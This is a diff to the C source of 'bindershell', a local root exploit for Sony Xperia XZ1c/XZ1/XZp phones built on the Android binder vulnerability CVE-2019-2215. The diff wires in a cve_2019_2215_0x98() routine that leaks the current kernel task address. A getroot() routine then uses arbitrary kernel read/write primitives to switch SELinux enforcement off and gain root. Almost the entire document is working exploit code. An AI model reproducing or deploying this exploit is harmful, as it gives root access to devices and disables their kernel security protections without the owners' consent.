@@ -26,70 +26,15 @@
 #include "debug.h"
 
 uint64_t opt_kaslr_slide;
-const char *my_task_name;
 
-#define TASK_STRUCT_NEXT_OFFSET 0x0478
-#define TASK_STRUCT_PID_OFFSET  0x0570
-#define TASK_STRUCT_TSP_OFFSET  0x06e0
-
-int get_my_task_struct_p(struct offsets *o, void **ptask)
-{
-	int ret;
-	int tsp_offset;
-	struct task_struct_partial *__kernel t;
-	struct task_struct_partial tsp;
-	void *__kernel task = o->init_task;
-	void *__kernel next;
-	pid_t my_pid, pid;
-
-	ret = -1;
-	my_pid = getpid();
-	tsp_offset = get_task_struct_partial_offset(task);
-	if (tsp_offset < 0)
-		return ret;
-	do {
-		if(read_at_address_pipe(task + TASK_STRUCT_PID_OFFSET, &pid, sizeof(pid)))
-			break;
-		t = (struct task_struct_partial *)(task + tsp_offset);
-		if(read_at_address_pipe(t, &tsp, sizeof(tsp)))
-			break;
-		if (strcmp(tsp.comm, my_task_name) == 0 && my_pid == pid) {
-			ret = 0;
-			*ptask = task;
-			break;
-		}
-		if(read_at_address_pipe(task + TASK_STRUCT_NEXT_OFFSET, &next, sizeof(next)))
-			break;
-		task = next - TASK_STRUCT_NEXT_OFFSET;
-	} while (ret < 0 && task != o->init_task);
-
-	return ret;
-}
-
-int getroot(struct offsets* o)
+int getroot(struct offsets* o, uint64_t current_task_addr)
 {
 	int ret = 1;
-	void * __kernel task;
-	int tsp_offset;
+	void * __kernel task = (void *)current_task_addr;
 	int zero = 0;
 
 	sidtab = o->sidtab;
 	policydb = o->policydb;
-
-	task = NULL;
-
-	if (client_curr_get_task_struct_p((uint64_t *)&task) < 0)
-		return ret;
-	tsp_offset = get_task_struct_partial_offset(task);
-	if (tsp_offset < 0)
-		return ret;
-
-	if (tsp_offset != TASK_STRUCT_TSP_OFFSET)
-		PNFO("tsp_offset=0x%04x\n", tsp_offset);
-
-	if (get_my_task_struct_p(o, &task) < 0)
-		return ret;
-	PNFO("task_struct %p\n", task);
 
 	if(o->selinux_enforcing)
 		write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
@@ -110,22 +55,24 @@ void reenable_selinux(struct offsets* o)
 		write_at_address_pipe(o->selinux_enforcing, &one, sizeof(one));
 }
 
+int cve_2019_2215_0x98(uint64_t *current_task_addr);
+
 int main(int argc, char **argv)
 {
 	int ret = 1;
 	struct offsets* o;
 	int uid;
+	uint64_t current_task_addr;
 
 	PNFO("\nbindershell - temp root shell for xperia XZ1c/XZ1/XZp using CVE-2019-2215\n");
 	PNFO("https://github.com/j4nn/renoshell/tree/CVE-2019-2215\n\n");
 
-	my_task_name = strrchr(argv[0], '/');
-	if (my_task_name != NULL)
-		my_task_name++;
-	else
-		my_task_name = argv[0];
+	if (cve_2019_2215_0x98(&current_task_addr) != 0) {
+		PERR("cve_2019_2215_0x98() failed\n");
+		return 1;
+	}
 
-	if (client_curr_get_kaslr(&opt_kaslr_slide) == 0)
+	//if (client_curr_get_kaslr(&opt_kaslr_slide) == 0)
 		PNFO("kaslr slide 0x%zx\n", opt_kaslr_slide);
 
 	if(!(o = get_offsets(opt_kaslr_slide)))
@@ -137,12 +84,11 @@ int main(int argc, char **argv)
 		return 0;
 	}
 
-	ret = getroot(o);
+	ret = getroot(o, current_task_addr);
 	if (ret)
 		return ret;
 
 	uid = getuid();
-	client_report_uid(uid);
 
 	if (uid == 0) {
 		pid_t pid;
